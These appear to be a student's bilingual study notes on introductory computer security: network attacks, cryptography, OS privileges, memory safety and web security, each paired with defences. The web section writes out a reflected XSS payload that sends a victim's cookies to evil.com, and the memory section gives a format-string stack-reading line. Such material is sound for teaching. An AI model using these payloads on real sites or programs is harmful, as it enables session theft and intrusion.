Introduction to Computer Security

*Security*
- **Confidentiality**: Authorization, Authenticity
	- not on physical security
- **Integrity**: The data is untampered and uncorrupted
	- backups
	- checksums
	- data correcting codes
	- not on metadata
- **Availability**: accessible
	- physical protections
	- computational redundancies

*Trust*
- Assurance: The means to know that the system is secure
- Reliability/Resilience: operate intact
- Accountability: The means to verify that the system is operating as designed (securely...)
- Trust/Trustworthy

私钥只存在于本机中

*Authenticity*
Ability to determine that statements, policies and permissions issued by persons or systems are genuine
*Nonrepudiation*: authentic statements issued by some person or system cannot be denied
*Digital signatures*, achieve nonreputation and also check integrity
Electronically identifying people

*Privacy*
Concerns individuals and their expectations on how their data behaviours, and interactions are recorded, utilised and spread
- Person gets to control information about themselves
- 不安全的库: 撞库攻击

**Teamwork for making secure system**

*Security Principles*
- *Economy of mechanism*: simplicity indesign and implementatioinof security measures
- [Fail-safe defaults](#^828d16)
- [Complete mediation](#^fb97be)
- [Open Design](#^3c24c2)
- [Privilege separation](#Privilege%20separation)
- *Least privilege*: Each program and user of a computer system should operate with the bare minimum privileges necessary to function properly
- *Least common mechanism*: in multiple users system, minimize shared resources, interactions and side-effects
- *Psycological acceptability*: 
	- UI should be well designed and intuitive
	- security-related settings should adhere to ordinary user might expect
- *Work factor*: cost, compaired with attacker resources
	- NONONO
- *Compromise recording*

*Threat Modelling*
- Who is the adversary
- What are they allowed to do / What cant we prevent them from doing
- What we want to prevent the adversary from doing or learning
- The set of threats we want to protect against given this adversary

Assets: Hardware, software, information
Vulnerabilities
Threats
- Interception
- Interruption
- Modification
- Fabrication
- Repudiation
- Epistemic
Attack
Controls: mitigating or removing a vulnerability

## Network Security

**Packet Switching**
Each packet transported independently through network, handled on a best efforts basis by each device.

**Stack of layers**
![](../img/Pasted%20image%2020250919171545.png)

![](../img/Pasted%20image%2020250919172056.png)

每一层解决的是固定范围的问题

**Encapsulation**
![](../img/Pasted%20image%2020250919172805.png)

**Media Access Control Address**
The first three octets of any MAC address are IEEE-assigned  
Organizationally Unique Identifiers
- E.g., Cisco 00-1A-A1, D-Link 00-1B-11, ASUSTek 00-1A-92, 00-0a-95 ??????

**Internet Control Message Protocol**
Network layer protocol, for network testing and debugging
Simple messages encapsulated in single IP packets
- Ping
- Traceroute

**Network Attacks**
![](../img/Pasted%20image%2020250919175136.png)

**Wireshark**
- Packet sniffer and protocol analyzer
- When run in promiscuous mode, captures traffic across the network

### Link & Network
**ARP**
Matching IP and MAC address, work in link-layer
- broadcasting messages of specified IP address, wait for response
- caches: static/dynamic
- `arp -a -d` flushed the ARP cache
- ***ARP Cache Poisoning***

**IP**
![](../img/Pasted%20image%2020250922173008.png)

![](../img/Pasted%20image%2020250922173208.png)

UDP multiple concurrent applications
TCP sequence

#### IP Spoofing
协议本身不验证源IP地址的真实性

在IP头中覆盖Source Address字段，并且重新计算Checkusm，后续回应会发往伪造的地址
- Dos
- 为了绕过WAF或进行TCP会话劫持，利用反射式回显

**Dealing with IP Spoofing**
Ingress/Egress Filtering, 子网边界路由器过滤
- 拒绝目标不是本子网IP的进入
- 拒绝**内部主机**发出目标是外部IP的数据

IP Traceback，溯源，拦截/隔离检查

#### TCP Hijacking
Attack hijack or alter a TCP connection from another user

*TCP sequence prediction* (session spoofing):
- Modern TCP stack implementations use pseudo-random number generators to determine sequene numbers
- Attacker attempts to guess an initial sequence number sent by the server at the start of a TCP session

![](../img/Pasted%20image%2020251201234842.png)

#### Denial-of-Service Attacks (DoS)
耗尽带宽或处理能力，新连接或正常通信无法完成

*Distributed-DoS*
Botnet

#### ICMP Attacks
*Ping Flood Attack*

*Smurfing Attack*
Expoloits ICMP **ping** requests thereby remote hosts respond to echo packets to say they are online. Some network respond to pings to **broadcast** address => *Smurf amplifiers*
- Ping a LAN on a broadcast address, **then all hosts on the LAN reply to the sender of the ping**

#### SYN Flooding
Sending thousands of SYN requests to the victim, without ack any replies. Bob accumulates more SYN packets than he can handle, runs out of space in **state table**
- attack don't need his own IP address, forge the source of the TCP packet
- attacker's own bandwidth, likely smaller than server's

**SYN cookies**: when memory is filled, the server sends a specially crafted SYN/ACK packet without creating a corresponding memory entry
![](../img/Pasted%20image%2020251201235821.png)

### Application Layer
![](../img/Pasted%20image%2020250924170835.png)
![](../img/Pasted%20image%2020250924171000.png)
Domain name contains not only latin alphabet
DoS attack on major DNS provider
- DNS Servers are soft targets for attackers
- Take out the mapping and the website goes "offline"

*Authoritative name server*: Stores reference version of DNS records for a zone (prartial tree)

*Name Resolver*
- Program that retrieves DNS records
- Connect to a nameserver (default, root, or given)
- Caches records received

```sh
ipconfig /displaydns    # view caches
ipconfig /flushdns      # clear caches
```

*DNS Cache Poisonoing*
Give a DNS server a false address record and get it cached
- UDP on port 53
- 16-bit requeist identifier in payload to match answers
- Pharming & Fishing
- when a resolver
	- query has **predictable** identifiers and return ports
	- attacker **answers begore** authoriative name server
	- ignore identifier, accepts unsolicited DNS records
- defences
	- Query rendomization
		- request identifier: 16 bits
		- return port: 16 bits
	- DNSSEC
		- signature on DNS request

Kaminsky: Subdomain DNS Cache Poisoning

![](../img/Pasted%20image%2020250924182029.png)
![](../img/Pasted%20image%2020251202012308.png)


### Application layer protection
#### Firewall
prevent unauthorized electronic access
- *firewall policies*: Blocklist/Allowlist
	- Accepted
	- Dropped: no return
	- Rejected: return a notion
- demilitarized zone (DMZ)

**packet filters(stateless)**
Each packet attempting to travel through it in isolation without considering packets that it has processed previously

**stateful filters**
maintains records of all connections passing through it and can determine if a packet is either the start of a new connection
- maintaining a *state table* on each active connection
- port scan
- TCP connection, recorded when session established, only accept TCP package when
	- session record matched
	- content is leagal for the session
- UDP, record first accepted package, subsequent trasmissions for same IP/port is all allowed until a timeout

**application layer**
Simulates the effects of an application, protective interceptor that screens information at an application layer, i.e. words censorship

#### NAT
https://www.hashemian.com/whoami/
IPv4 and address space exhaustion

#### Intrusion Detection Systems (IDS)
Firewalls are preventative, IDS detects a potential incident in progress
- Let some traffic into and out the network is essential
- Most security incidents are caused by passing malicious
- cannot be prevented or anticipated in advance
- quickly addressing

*NIDS Network IDS* 网络边界或关键位置
- 攻击特征库signatures
- 流量统计分析
*DIPS Protocol-based*: deployed on specific host, monitoring ideal protocol
*HIDS Host-based*: detect by audit/system log

*Rule-based IDS*: attack pattern signature
+
*Statistical IDS*: gathering audit data about a certain user or host, to determine baseline numerical values about the action that the person or machine performs
- 新型或未知攻击
- 学习不足时误报率高
- 隐蔽攻击容易绕过

Detect malicious
- masquerader
- misfeasor
- clandestine user

- port scans
- DoS, DDoS
- Malware
- ARP spoofing
- DNS cache poisoning

#### Intrution Prevention System (IPS)
检测威胁流量，自动更新WAF规则，过滤/丢弃该段流量
IPS Snort

对IDS发起DoS，淹没真正的攻击

**The Base-Rate Fallacy**
当“真实入侵事件”在所有事件中占比很小时，即使 IDS 的检测精度看起来很高，也可能导致绝大多数告警都是误报。
![](../img/Pasted%20image%2020251026233941.png)

#### Port Scanning
- port open, accepting connections
- port closed, not accepting connections
- port blocked, by firewall or other device is preventing traffic

nmap

*Fingerprinting*: 推断服务类型、版本、操作系统等

openning port == potential targets for attack

TCP scan ==> SYN scan
UDP scans
- port closed: ICMP: not achieveable
- port open/blocked: no return
- payload design

*Idle scanning*
relies on finding a third-party maching as a "zombie", taht has predictable TCP sequence numbers
![](../img/Pasted%20image%2020251202024221.png)

### Network Security 
- Confidentiality
- Integrity
- Availability
- Assurance
- Authenticity
- Anonymity

DoS, Eavesdropping, Man-in-the-Middle, Masquerading

## Cryptography
### Symmetric encryption
![](../img/Pasted%20image%2020251001170444.png)

Kerckhosff principle
- E and D algorithms are public
- security relies entirely on the secrecy of the key

Assume that the algorithm is known by everyone. open design principle
Security by obscurity
- company documents published or stolen
- programmer bribed/disclose
- reverse engineered

unicity distance  使得合理解密唯一的最小密文长度
- 语言中帮助理解和交流的 冗余

![](../img/Pasted%20image%2020251001171006.png)

Frequency Analysis

#### One-Time Pad
(Binary)
![](../img/Pasted%20image%2020251001173136.png)

Perfect secrecy
> 看到某个密文 c 之后，攻击者不能从中判断到底是哪个明文更有可能被加密得到它。密文中不带任何关于明文的信息。

![](../img/Pasted%20image%2020251202222327.png)

![](../img/Pasted%20image%2020251001172949.png)
![](../img/Pasted%20image%2020251001173325.png)
same likelyhood of keys behind the ciphertext

*Two-time pad attacks*

Getting true randomness
- the key should not be guessable from an attacker
- if the key is not truly random, frequency analysis might again be possible

OTP is mellable
> given the ciphertext 𝑐 = 𝐸(𝑘, 𝑚) with 𝑚 = 𝑡𝑜 𝑏𝑜𝑏 ∶ 𝑚0, it is possible to compute the ciphertext 𝑐′ = 𝐸(𝑘, 𝑚′) with 𝑚′ = 𝑡𝑜 𝑒𝑣𝑒 ∶ 𝑚0 
> 𝑐′ ∶= 𝑐 ⊕ "𝑡𝑜 𝑏𝑜𝑏 ∶ 00 ... 00" ⊕ "𝑡𝑜 𝑒𝑣𝑒 ∶ 00 ... 00"
#### Stream Ciphers
Use a pseudooramdom key rather than a really rondom key
*Pseudo-Random Number Gernerator*
![](../img/Pasted%20image%2020251001174638.png)

PRNG Security Properties
- hard to predict from previous numbers of sequence
- seed ==> repeating period

RC4: used in HTTPS and WEP
no reuse seed

#### Block Ciphers
![](../img/Pasted%20image%2020251003170658.png)

DES
- 2^56 to do an exhaustive search over the key space, 1997
- affine approximations to DES, total attack time 2^43

3DES: 3keys, 3 time slow than DES
2DES: meet-in-the-middle attack

Encrypt `𝑀` using a block cipher operating on blocks of length `ℓ` when `|𝑀| ≠ ℓ`
- Bit padding: 1000000
- ANSI X.923: pad 0, number of padded in last type
- PKCS#7: value of each added type is the total number of padding bytes

*Elecctronic Code Book* mode
![](../img/Pasted%20image%2020251003174416.png)
Same input in each block, same output
- Melleable and weak to frequency analysis
- No using in semantic security

*Cipher-Block Chaining (CBC)* mode
![](../img/Pasted%20image%2020251003174638.png)

*Counter (CTR)* mode
![](../img/Pasted%20image%2020251003174902.png)
![](../img/Pasted%20image%2020251202230852.png)

#### Hash functions
*One-way functions (OWFs)*: easy to compute and hard to invert
![](../img/Pasted%20image%2020251006170347.png)
- Multiplication of large primes, hard to retrieve

*Collision-resistant functions (CRFs)*
![](../img/Pasted%20image%2020251006171306.png)
- successor function
- multiplication of large primes

Hash funciton: arbitrary length and returns a fixed-seze bit string
![](../img/Pasted%20image%2020251006171705.png)

The birthday attack: why large cipher space
![](../img/Pasted%20image%2020251006173132.png)

Merkle-Damgard: SHA-256

#### Message Authentication Codes (MACs)
Message integrity & Authenticity
![](../img/Pasted%20image%2020251006174049.png)

Always compute the MACs on the ciphertext, never on the plaintext
Use two different keys, one for encryption $\color{#b293f6}K_E$ and one for the MAC $\color{#b293f6}K_M$

Galoris Counter Mode

### Asymmetric encryption
#### Online Trusted Third Party (TTP)
![](../img/Pasted%20image%2020251008172305.png)

Public-key encryption
![](../img/Pasted%20image%2020251008172739.png)

#### Numbers theory: modulo inverse
*Relative primes*
![](../img/Pasted%20image%2020251008173520.png)

*Integers modulo*
![](../img/Pasted%20image%2020251008174355.png)

*Multiplicative group of integers modulo `n`*
![](../img/Pasted%20image%2020251008174447.png)
- Factoring
- RSA: 利用欧拉函数定理的特点，构造两个超大素数的互质密钥空间
	- Euler Function $\color{#b293f6}\varphi$: $\varphi(n)$ 是 $1\le x<n$ 中与 n 互素的个数
	- 欧拉定理$$x^{\varphi(n)}\text{ mod n}=1$$若 p 是素数，则 $\varphi(p) = p-1$
- Discrete Logarithm Problem

#### No TTP Asymmetric key distribution
*Diffie-Hellman protocol*: good for ephemeral encrypt, key exchange
![](../img/Pasted%20image%2020251010171318.png)

raw RSA ==> Man In The Middle

![](../img/Pasted%20image%2020251010174757.png)
生成元`g`需要满足 $g^1,g^2,...,g^{p-1}$ 在 $\mathrm{Z}_p$ 空间下都是非零值, 即 $$g^{(p-1)/p_i} \not\equiv 1 \pmod p$$
 $\mathrm{Z}_p$ 乘法群中的生成元数量为 $$\varphi(\varphi(p))=\varphi(p-1)$$

![](../img/Pasted%20image%2020251203234624.png)

加密find解密
算法proof

#### Signatures
Data integrity and origin authenticity in the public-key setting
![](../img/Pasted%20image%2020251013171645.png)
- Nonforgeability
- Nonmutability
- Nonrepudiation

![](../img/Pasted%20image%2020251013171549.png)

![](../img/Pasted%20image%2020251013171720.png)

##### CAs distribution
Let's Encrypt
Certificates with OpenSSL

```sh
openssl s_client -connect www.google.com:443 -servername
www.google.com | openssl x509 -text -noout
```

Revocation once the corresponding private key has beed compromised
- Certificate Revocation Lists (CRLs), each CA kept one
- Online Certificate Status Protocol (OCSP)

###### X.509
![](../img/Pasted%20image%2020251204003255.png)
Certification Path 证书信任链
多CA互相签名

**v3**: Extensions
- Key and Policy Information
- Certificate Subject and Issuer Attributes
- Certification Path Constrains

![](../img/Pasted%20image%2020251204010655.png)


### Post-Quantum Security
Quantium bits (qubits): Can be in superposition of 0 and 1 sumultaneously

*Superposition*
- A qubit can represent both states at once
- `n` qubits can represent all $\color{#b293f6}2^n$ values simultaneously

*Entanglement*: measuring one qubit instantly affects others
- enables parallel computation across exponentally many states

Process all possibilities at once, extract aswer through interference
- "try all solutions instantly"

maintain quantum state of qubits

Larger input sizes needed

Store now, decrypt later

Given 𝐹: $\color{#b293f6}{0, 1}^𝑛 → {0, 1}$, Grover's algorithm makes $𝑂(2^𝑛/2)$ quantum evaluations of 𝐹 and outputs 𝑋 ∈ {0, 1}𝑛 such that 𝐹(𝑋) = 1, if such 𝑋 exists
![](../img/Pasted%20image%2020251013185416.png)
- $O(2^{n/2})$ time

OpenSSH

## OS Security
### Operating System
Mediate between applications and harware

Multi-users: isolate different users privileges/demand
- preventing misuse, abuse and damage
Multi-tasks: isolate different applications running
- time slice of CPU
- preventing disrupt, race condition...

#### Unix architecture
- *kernel*: base composition of OS
	- supports secure sharing of low-level hardware resources between processes/users/applications
	- limits how applications access computer resources
	- OS = Kernel + Non-essential OS Applications
- *Exucution modes*
	- *User mode*: access to resources through syscall to kernel
	- *Kernel mode*: direct access to resources (hardwares)
		- direct interaction with hardware
- *System calls*: user mode programs for hardware resources, C library `libc`
- *Device drivers*: each Input/Output device, only expose drivers API to apps for calling, low-level detailed instructions are operated by driver and kernel

#### Processes and process management
- an instance of a program currently executing
- unique *PID* for each
- loaded into RAM
- CPU time, meory useage, program name...
- *Time Slicing*: giving each a fair share of the CPU, enable multitasking
- `fork`: create and control another process (**child process**), inherits context from parent process
![](../img/Pasted%20image%2020251205220645.png)

##### Process Privileges
- `uid`: `uid 0`: root account, highest privilege
- `gid`: group
- `euid`: effective user ID, file owner, 当前进程在euid用户权限下运行
	- 大多数情况，`euid == uid`
	- 单独将其设置为高权限用户id，可以令普通用户临时以更高权限执行当前程序，`setuid`

`setbid`: 当程序运行时，其有效组ID会被设置为程序文件所属的组，而不是父进程的组ID （调用者）

setuid: privilege escalation

> 默认低权限运行，只在确有必要时短暂提升权限，完成后立即降回去

##### Inter-Process Communication (IPC)
- reading and writing files: no privacy, slow, easy to implement
- shared memory: fast, sync, race condition
- pipes: producer/consumer
- sockets
- signals
- rermote procedure calls (RPC)

##### Daemons / Services
typically started by the `init` process and operate with varying levels of perissoins

forked before the user is authenticated, they are able to run with higher perisssions than any user

#### File Access Control
Unix: Path-Based
![](../img/Pasted%20image%2020251205223201.png)

principal 主体
permission 权限

Access Control Entry (principal, type, permission)
- `type`: allow, deny
Access Control List: serious of ACE

##### Linux Permissions
Descretionary Access Control (DAC) 自主访问控制
- optional ACE

SELinux: Mandatory Access Control
- no more DAC, control by system security policy administrator
	- subject
	- object
	- permissions
- Least privilege

##### Windows Permissions
ACL + allow/deny

Only the ACL of the file in question is inspected before granting access

*Inherited ACEs*: any ACEs applied to a folder may be set to apply to the subfolders and files within it

*explicit ACEs*: SCEs are specifically set

Administrtors may stop the propagation of inheritance at a particular folder

- deny ACE 优先于 allow ACE
- explicit ACE 优先于 inherited ACE
- 在继承的 ACE 里，**越近的祖先优先级越高**
    - 父目录的 ACE > 祖父目录的 ACE > 更上层……

advanced permissions 细分权限

#### RAM: 
- 
- input data
- working memory
- `%eip` to points to next instruction

For a piece of address space which allocated to a process
- *Text*: machine code for the running program, **read-only**
- *Data*: static variables, initialized before program start
- *BSS*: static variables, not initialized, 0
- *Stack*: function calling info, from higher to lower `%esp`
	- return address, parameters, local variables
- *Heap*: dynamic segment, variable size, from lower to higher
	- malloc, new, object...

> Processes are not allowed to acccess the address space of other processes

User space / Kernel space

*Virtural memory*: a section of the hard drive to emulate RAM
- Memory Management Unit maps logical address -> physical address
- The segments may be sparse

![](../img/Pasted%20image%2020251017173451.png)

#### Virtural Machines
*Emulation*: the host operating system sumulates virtual interfaces that the guest operating system interacts with

*Virtualization*: the virtual interfaces within the VM must be matched with the actual hardware on the host machine

- Heardware Efficiency: resource allocation, better utilization
- Portability: guestOS == a big file
- Security: sandbox
- Management Convenience: snapshot

### Security principles
*Defence-in-depth*: build multiple layers of the system, if one machanism fails, other steps up immediately
- Firewalls
- instusion detection and protection systems
- network segmentation
- anti-virus, least privilege
- strong passwords
- patch management

**Users and programs should only access the data and resources required to perform its function**

Segment the system priviledges

*Open design*
The security of a mechanism **should not** depend on its secrecy and obscurity, should rely on keeping cryptographic keys secret
The design and implementation details always get leaked ^3c24c2

When designing a security mechanism **keep it simple**
- security researchers: allow verification
- delopers: avoid bugs
- users: avoid misuses

*Security principles*
*Fail-safe defaults*: default configuration should be conservative
*Complete mediation*: every access to a resource must be checked for comliance with security policy
*Usable security*: UIs and security machanisms should be designed with the ordinary user in mind, the users should be supported in interacting in a secure way with the system ^828d16

### Privilege separation
***Who is allowed to access what and how***

Multiple conditions shoule be requireed to schieve acceess to restricted resources or have a program perform some action

*Complete meditation*: all requests go to the reference monitor must be checked for compliance with a protection scheme
The **reference monitor** grants permission to users to apply certain opperations to a given resource ^fb97be

**Users** `uid`
- User accounts: humans
- Service accounts: background processes
```/etc/passwd
username:password:uid:gid:uid_info:home:shell
```

**Groups** `gid`
A set of users that share resources
```/etc/group
group_name:password:gid:group_list
```

**File permissions**: rwxrwxrwx
- only root and owner can change file perissions
- only root can change file ownership

**Processes** `pid`
Each process is associated with the user that spawned it
Every process has
- Real user `uid`: the user ID that started the process
- Effective user `euid`: the user ID that determines the process' privileges 进程的权限被设置为该文件的所有者的
- Saved user `suid`: the effective user ID before the last modification 用来临时切换权限
Root can change `euid`/`uid` to arbitrary value `x`
Unprivileged users can only change `euid` to `uid` or `suid`
![](../img/Pasted%20image%2020251020174602.png)

If `A` executes a `setuid` file owned by `B`, the `euid` of the process is `B` not `A`, hte priviledge is also `B`

### Password authentication
username and password: hard to guess and easy to remember

Defending against eavesdroppers

#### Phishing attacks
![](../img/Pasted%20image%2020251022171535.png)

*NCSC*   www.ncsc.gov.uk/guidance/phishing
1. Make it difficult for attackers to reach users
2. Help users identify and report suspend phishing emails
3. Protect your organisation from the effects of undetected phishing emils
4. Respond quickly to incidents

Against phishing: Password manager

*Malware attacks*: records keyboard stroke and intercept passwords when typed
- Mitigation: Second-factor authentication

#### Guessing
*Brute force attack*
Try all passwords $K^\mathscr{l}$ 
- `K`: possible characters
- `l`: password length

*Dictionary attack*
- The N most common passwords
- Words in English dictionary
- Personal relatives: names, places, totable dates
- Combinations of the above

Defending against online guessing attacks
- A good password
- Rate limit: number of failed password attempts
- captchas: automated prevent

Offline guessing attacks: leak the password database
**Salt and Hash passwords**
- $\color{#b293f6}d_1 = H(s_1 ||pwd_1)$
- since every user has a different salt, identical passwords (different platform) will not have identical hashes
- use a slow hash functions
- when salting one cannot use preexisting tables to crack passwords easily

### Memory Management
1. The compiler converts C code to assembly code
2. The assembler converts assembly code to machine code
3. The linker deals with dependencies and libraries
4. The loader sets up address space in memory and load machine code in memory, and jumps to the first instruction of the program
5. The CPU interprets instructions
	- `%eip` points to next instruction, increased after each instruction
	- `$eip` modified by `call`, `rep`, `jmp` and conditional `jmp`

*x86-32 registers*
![](../img/Pasted%20image%2020251024171700.png)

Endianess
- Little-endian, most commmon micro-architectures
- Big-endian

### Buffer overrun attacks
*Control hijacking*: a buffer overflow can change the flow of execution of the program
- load malicious code into memory
- make `%eip` points to it

#### Shellcode injection
- machine code instructions
- cannot contain any \0 bytes
- no OS loader using
![](../img/Pasted%20image%2020251027183243.png)
how far the overflowed variable from the saved `%ebp`
- possibilities? brute-force?
- NOP sled: insert many NOPs before Shell Code in memory

Unsave libc functions: `strcpy`, `strcat`, `gets`, `scanf`
- They **do not check bounds of buffers** they manipulate

Safe function: `fgets`

#### Arithmetic overflow
variables wrapping around
![](../img/Pasted%20image%2020251027185052.png)

`size_t`: return value of `sizeof` only positive number, when passing in a negative number, will be interpreted as a unsigned number

Heap-based buffer overflow
- when `len` is very large, the `len * sizeof(int)` may out-of-range
- *garbage collection* and *heap implementation* understanding required

Format string: Exploit
```c
printf("%08x.%08x.%08x.%08x.%08x|%s|");
```
- `%x` 表示以十六进制输出下一个栈上的值。
- 连续使用 `%x` 可以遍历栈上的内容，直到发现想要的地址。
- `%s` 则会把一个栈上的值当作指针去读取字符串内容。

![](../img/Pasted%20image%2020251029181639.png)

### Memory safety defenses
1. Use memory-safe languages
	- access to memory is well-defined
	- check on array bounds and pointer dereferences are automatically included by the compiler
	- garbage collection takes away from the programmer, the error-plone task of managing memory
2. Apply safe programming practices
	- use safe C libs
	- check bounds and validate user input
3. Code hardending
	- *Stack canaries*: place trap just before teh stack return pointer
		- be able to guess the value: brute force
		- be ablt to jump over
		- will not detect heap overruns
	- *W^X*: Write XOR Execute: Make regions in memory **either executable or writeable** (not both)
		- Limitation: return-to-libc attacks
	- *ASLR*: Address Space Layout Randomization: place std libs to random locations in memory, attack cannot directly point into `exec()`

safe programming
ensure that the progrm does not copy more data than the buffer can hold

> OSes may have efeatures to reduce the risks of BOs, but the best way to guarantee safety is to remove these vulnerabilities fro application code

## Zero Knowledge
NP statements Arbitrary polynominal time computable checks

Convince verifier without reveal the witness w

Mslicious verifier does not learn anything about w

the verifier can compute the protocal message itself

- completeness
- soundness
- zero-knowledge

simulation paradigm: a simulator trying to recomput
indistinguishaable: simulator cannot get any information about w in the protocol

### Proof of Knowledge
the provider has ability to efficiently compute w
Extractoro: 
- A valid witness w
- Interrogate the prover (malicisous)

Cut and Choose
*Construct Zero Knowledge and Proofs of Knowledge*

Randomized Anagram

## Secure Communications
### SSL/TLS
Public key certificate, assurance by a third party that a public key is associdated with an identity

Chain of trust and Revocation
- Trust/public_key of issuer implies trust/public_key of subject
- Chain of certificates
- 浏览器内置根证书作为信任锚，通过链式签名把信任传到目标站点证书。

*chain of certificates*
- `level 0`: Root CA, internally embedded by browsers
- `level 1`: Intermediate CA, signed by Root, for batching signature
- `level 2`: End-Entity (leaf), signed by Intermediate, site or user

RootCA ──signs──> SubCA ──signs──> Server
>  每一级的证书都包含“签名者是谁 + 被签名的公钥 + 签名值”

Revocation: private key compromised
- post on CA's site

简化握手
### Anonymous Communication
Routing information can reveal who you are
- Your IP address is Your ID

*Anonymity*: A user may use a service or resource without disclosing the user's identity

![](../img/Pasted%20image%2020251105182027.png)
- required pair-wise shared secret keys between teh participants
- requires large amounts of randomness
- DoS

*Crowds*: Randomly route the request through a crowd of users
- NOT resistant against an attacker that sees Dthe whole network traffic!

*Chaum's mix*
![](../img/Pasted%20image%2020251105184228.png)
message padding and buffering to avoid time correlation attacks
one user

*Anonymous return address*
![](../img/Pasted%20image%2020251105184722.png)

Pool: always some messages in the pool, once timer out, it is canditate to be sent

### Tor
mixes
![](../img/Pasted%20image%2020251107201723.png)

#### Website Fingerprinting Attack
traffic fingerprinting
the Tor still reveal
- Timing
- Packet sizes
- Direction of travel pattern

Decreasing accuracy at scale raising
Base Rate Neglect

### Public Key Transparency
authentication of the key
each user keep a public key on platform

Transparency -> trust: inclusion and integrity of the key
- users can verify their own keys
- anyone can verify anyone else's keys

*Markle tree*
- leaf nodes hold data: ID and key
- intermediate (root) nodes are hashes of the contents of the left and right sub-nodes

![](../img/Pasted%20image%2020251113015455.png)

> 根节点是全树的唯一承诺（root hash）。树一处改动会引发根哈希改变；同时，给任何一个叶子生成**认证路径（authentication path）** 只需 O(log n) 个哈希值，验证者据此可在本地重算根哈希并与“公共根哈希存储”对比。这样就实现了“大规模数据、极短证明”的目标，而且更新叶子时只需重算沿路径的哈希，成本低、适合增量更新。


Alice updaes (verify) the root of the tree continuously to avoid swaping attack

Split-view attack
- everyone needs to have the same root hash view: a append-only log data structure
## Web Security
Cookies is what going to protect
`<iframe src="URL"></iframe>`: outer webpage specifies the size and position of the inner webpage within the outer webpage

**Web applications should provide the same security guarantees as those required for standalone applications**

Web attacker
- controls `evil.com`
- has valid SSL/TLS certificates for `evil.com`
- victim user visits `evil.com`

Network attacker: controls the whole network: cna intercept, craft, send messages

A Web attacker is weaker than a Network attacker

### Web security model
#### SOP: Same Origin Policy
Scripts can manipulate the Dom of a page using the API for the document or window elements, which are the variaous elements in the web page

origin: protocol://domain:port

*window*
cross-origin scrpt will execute with parent frame/window's origin

no inspectng it, able to call functions

`postMessage` interface allows windows to talk to each other no matter which origin they are from

#### Cookie Policy
Scripts can manipulate the cookies stored in the browser using the API for the document elements

prevents a script from accessing the cookies

`Set-Cookie`

Cookie policy shares the same main domain
SOP different sub-somain shoule be viewed as different origins and isolated

`HTTPonly`: if enabled scripting languages cannot accessing or manipulating the cookie, can prevent GA from accessing cookies set by `example.com`

*Secure Cookies*
A cookie with the Secure attribute is sent to the server only with an encrypted request over the HTTPS protocol, never with unsecured HTTP.

*SameSite Cookies*
Prevent the cookies go anywhere except the given domain
Browser will not send them

### XSS: Cross-Site Scripting
*Session highjacking*
Session hijacking is the exploitation of a valid computer session to gain unauthorized access to informaiton or services in a computer system
- predictable tokens
	- unpredictable cookies
- site has mixed HTTPS/HTTP pages and token is sent over HTTP rather than HTTPS
	- set secure attribute for session tokens
	- always issue a new session token when elevating a user
- XSS vulnerabilities
- CSRF vulnerabilities

> Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites

#### Stored XSS Attacks
The injected script is permanently stored on the target servers
The victim then retrieves the malicious script from the server when it requests the stored information

#### Reflected XSS Attacks
The injected script is reflected off the web server
Reflected attacks are delivered to victims via route, such as in e-mail message, or on some other web site
http://xss-game.appspot.com/

The key to the reflected XSS attack  
Find a “good” web server that will echo the user input back in the  
HTML response


1. Alice visits evil.com which contains the link  
```js
	https://victim_site.com/search.php?term=<script>window.location=‘http://evil.com/?c=’+document.cookie</script>  
```
2. Alice clicks that link  
3. Alice’s browser will send a GET request to that URL  
4. victim_site returns 
```js
<html> <title> Search results  
</title> <body> Results for <script>...</script>  
... </body> </html>
```
5. Alice’s browser executes `<script>...</script>` within the origin `https://victim_site.com` and send to `evil.com` cookies for `victim_site.com`

#### XSS defenses
*Escape/filter output*: escape dynamic data before insert into HTML
*Input Validation*: check all inputs are of expected
*CSP*: server supplies a whitelist of the scripts that are allowed to appear  
on the page
*Http-Only* attribute: scripting languages cannot access or manipulate the cookie

### CSRF: Cross-Site Request Forgery
> CSRF forces a user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks target stage-changing requests, not theft of data, since the attacker has ho way to see the response to the forged request

Theft of grants

Attacker: have the victim visit attacker's server while logged-in to vulnerable server

The authentication cookies are automatically sent by the  
victim browser.

Cookies are insufficient when side effects

TLS does not prevent CSRF attacks

#### CSRF Defenses
The server ensures that the HTTP request (the **referer**) has come from the original site.
- can also be modified

*CSRF tokens*: make URLs unpredictable
- Includes a fresh CSRF token in every form as a hidden field
- On every request, the server chesks that the supplied token is the valid one
- different in each server response, avoid replay attack

`SameSite` flag on cookies: prevents cookies from being sent in cross-site requests

# TTL
salting password: high probs for multiple people using same password, or same person use same password on different platform.
- hash to hiding the plain password: same value stored
- break one != break all
- salt is visible, just for slow down the attacking process

calling functions: choosing size_t parameters tranferred
check must do: 
- check array not null
- size_t not 0
- two size_t same
- `a != NULL && b != NULL && m < size(a) && n < size(b) && m <= n+1`

human factor
open design principle
default save mode